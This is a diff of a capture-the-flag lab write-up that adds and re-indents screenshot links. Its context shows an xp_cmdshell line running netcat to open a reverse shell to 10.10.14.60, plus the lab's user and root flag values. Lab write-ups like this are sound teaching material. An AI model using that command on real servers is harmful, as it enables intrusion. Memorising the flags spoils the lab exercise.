@@ -99,6 +99,7 @@ xp_cmdshell "C:\\Users\\sql_svc\\Downloads\\nc64.exe -e cmd.exe 10.10.14.60 443"
 
 In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
 
+![scan port](./image/Task5_get_user.jpg)
 
 9. Now, we need to get the root flag:
 
@@ -144,7 +145,7 @@ In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
 
     Get the root flag: b91ccec3305e98240082d4474b848528.
 
-     ![scan port](./image/Task5_get_root.jpg)
+   ![scan port](./image/Task5_get_root.jpg)
 
 ## Task 2
 
